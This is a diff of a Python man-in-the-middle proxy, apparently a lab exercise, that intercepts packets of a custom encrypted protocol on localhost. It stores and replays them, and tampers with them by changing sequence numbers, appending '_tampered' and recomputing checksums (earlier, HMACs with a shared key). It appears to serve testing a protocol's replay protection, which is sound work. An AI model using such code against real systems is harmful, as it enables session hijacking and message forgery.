@@ -10,6 +10,7 @@ from Crypto.Cipher import AES
 from Crypto.Hash import HMAC, SHA256
 
 from protocol import send_message, receive_message
+from protocol.src.checksum import compute_checksum
 
 # Configuration
 CLIENT_LISTEN = ('127.0.0.1', 8000)  # Proxy listens here; client connects here
@@ -32,21 +33,25 @@ class ReplayAttacker:
         """Intercept packets from client, forward to server, and store them."""
         while True:
             try:
-                packet = receive_message(client_sock)
+                packet = client_sock.recv(1024)
                 if not packet:
-                    logger.info("[ATTACKER] No more packets from client. Closing connection.")
                     break
 
-                # Store the packet for replay
-                self.stored_packets.append(packet)
-                logger.debug(f"[ATTACKER] Intercepted and stored packet: {packet}")
+                # Validate packet length
+                if len(packet) < 18:  # Minimum size for IV (16 bytes) + seq_num (2 bytes)
+                    logger.warning(f"[ATTACKER] Received malformed packet: {packet.hex()}")
+                    continue
 
-                # Forward the packet to the server
-                send_message(server_sock, packet)
-                logger.debug(f"[ATTACKER] Forwarded packet to server: {packet}")
+                # Extract IV and sequence number for storage
+                iv = packet[:16]  # Assuming IV is the first 16 bytes
+                seq_num = struct.unpack('>H', packet[16:18])[0]  # Assuming seq_num is next 2 bytes
 
+                self.stored_packets.append((iv, seq_num, packet))
+                logger.debug(f"[ATTACKER] Intercepted packet with IV={iv.hex()} and seq_num={seq_num}")
+
+                server_sock.sendall(packet)
             except Exception as e:
-                logger.error(f"[ATTACKER] Error intercepting: {e}")
+                logger.error(f"[ATTACKER] Error intercepting packet: {e}")
                 break
 
     def intercept_and_forward_to_client(self, server_sock, client_sock):
@@ -67,94 +72,72 @@ class ReplayAttacker:
                 break
 
     def replay_packets(self, server_sock):
-        """Replay stored packets to the server with modified sequence numbers."""
+        """Replay stored packets to the server."""
         logger.info("[ATTACKER] Replaying stored packets...")
-        for i, packet in enumerate(self.stored_packets):
+        for iv, seq_num, packet in self.stored_packets:
             try:
-                # Modify the packet to make it appear unique (e.g., change sequence number)
-                modified_packet = self.modify_packet(packet, i)
-                send_message(server_sock, modified_packet)
-                logger.debug(f"[ATTACKER] Replayed modified packet: {modified_packet}")
-                time.sleep(1)  # Add delay between replays if needed
+                logger.debug(f"[ATTACKER] Replaying packet with IV={iv.hex()} and seq_num={seq_num}")
+                server_sock.sendall(packet)
             except Exception as e:
                 logger.error(f"[ATTACKER] Error replaying packet: {e}")
 
-    def modify_packet(self, packet, new_seq):
-        """Modify the packet to change its sequence number and recalculate HMAC and CRC."""
-        # Decrypt the packet to access its fields
-        cipher = AES.new(KEY, AES.MODE_CTR, nonce=NONCE, initial_value=IV0)
-        plaintext = cipher.decrypt(packet)
+    def modify_and_replay_packets(self, server_sock):
+        """Modify stored packets and replay them."""
+        logger.info("[ATTACKER] Modifying and replaying stored packets...")
+        for iv, seq_num, packet in self.stored_packets:
+            try:
+                # Modify sequence number (e.g., increment by 1)
+                new_seq_num = (seq_num + 1) % 65536  # Ensure it wraps around at 16 bits
+                new_seq_bytes = struct.pack('>H', new_seq_num)
 
-        # Extract fields from the plaintext
-        seq = struct.unpack(">I", plaintext[:4])[0]
-        payload = plaintext[4:-42]  # Exclude TS(8), HMAC(32), CRC(2)
-        ts_bytes = plaintext[-42:-34]
+                # Modify payload (e.g., append extra data)
+                payload = packet[18:-2]  # Extract payload (excluding IV, seq_num, and checksum)
+                modified_payload = payload + b"_tampered"
 
-        # Update the sequence number
-        new_seq_bytes = struct.pack(">I", new_seq)
-        data_to_mac = new_seq_bytes + payload + ts_bytes
+                # Recalculate checksum (assuming checksum is last 2 bytes)
+                new_packet = iv + new_seq_bytes + modified_payload
+                new_checksum = struct.pack('>H', compute_checksum(new_packet))
 
-        # Recalculate HMAC
-        h = HMAC.new(KEY, digestmod=SHA256)
-        h.update(data_to_mac)
-        new_mac = h.digest()
-
-        # Recalculate CRC
-        new_plaintext = data_to_mac + new_mac
-        new_crc = binascii.crc_hqx(new_plaintext, 0).to_bytes(2, 'big')
-
-        # Assemble the modified packet
-        modified_plaintext = new_plaintext + new_crc
-        modified_packet = cipher.encrypt(modified_plaintext)
-
-        return modified_packet
+                # Assemble modified packet
+                modified_packet = new_packet + new_checksum
+                logger.debug(f"[ATTACKER] Replaying modified packet with new_seq_num={new_seq_num}")
+                server_sock.sendall(modified_packet)
+            except Exception as e:
+                logger.error(f"[ATTACKER] Error modifying/replaying packet: {e}")
 
     def run(self):
         """Run the attacker as a man-in-the-middle proxy."""
         try:
-            # Initialize variables to avoid referencing before assignment
-            client_sock = None
-            server_sock = None
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_sock, \
+                 socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_sock:
 
-            # Listen for client connection
-            client_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow address reuse
-            client_listener.bind(CLIENT_LISTEN)
-            client_listener.listen(1)
-            logger.info(f"[ATTACKER] Listening for client on {CLIENT_LISTEN}")
+                client_sock.bind(CLIENT_LISTEN)
+                client_sock.listen(1)
+                logger.info("[ATTACKER] Waiting for client connection...")
 
-            client_sock, _ = client_listener.accept()
-            logger.info("[ATTACKER] Client connected.")
+                conn, addr = client_sock.accept()
+                logger.info(f"[ATTACKER] Client connected from {addr}")
 
-            # Connect to the real server
-            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server_sock.connect(SERVER_TARGET)
-            logger.info(f"[ATTACKER] Connected to server at {SERVER_TARGET}")
+                server_sock.connect(SERVER_TARGET)
+                logger.info("[ATTACKER] Connected to server")
 
-            # Start intercepting and forwarding in separate threads
-            client_to_server_thread = threading.Thread(target=self.intercept_and_forward, args=(client_sock, server_sock))
-            server_to_client_thread = threading.Thread(target=self.intercept_and_forward_to_client, args=(server_sock, client_sock))
+                # Start intercepting and forwarding threads
+                threading.Thread(target=self.intercept_and_forward, args=(conn, server_sock), daemon=True).start()
+                threading.Thread(target=self.intercept_and_forward, args=(server_sock, conn), daemon=True).start()
 
-            client_to_server_thread.start()
-            server_to_client_thread.start()
-
-            # Wait for threads to finish
-            client_to_server_thread.join()
-            server_to_client_thread.join()
-
+                # Wait for user input to trigger replay
+                while True:
+                    cmd = input("Enter 'replay' to replay packets or 'modify' to modify and replay: ").strip()
+                    if cmd == 'replay':
+                        self.replay_packets(server_sock)
+                    elif cmd == 'modify':
+                        self.modify_and_replay_packets(server_sock)
+                    elif cmd == 'exit':
+                        break
         except Exception as e:
-            logger.error(f"[ATTACKER] Error in run method: {e}")
+            logger.error(f"[ATTACKER] Error in proxy: {e}")
         finally:
-            # Clean up
-            try:
-                if client_sock:
-                    client_sock.close()
-                if server_sock:
-                    server_sock.close()
-                client_listener.close()
-                logger.info("[ATTACKER] Cleaned up resources.")
-            except Exception as e:
-                logger.error(f"[ATTACKER] Error during cleanup: {e}")
+            logger.info("[ATTACKER] Shutting down attacker proxy")
 
 if __name__ == "__main__":
     attacker = ReplayAttacker()
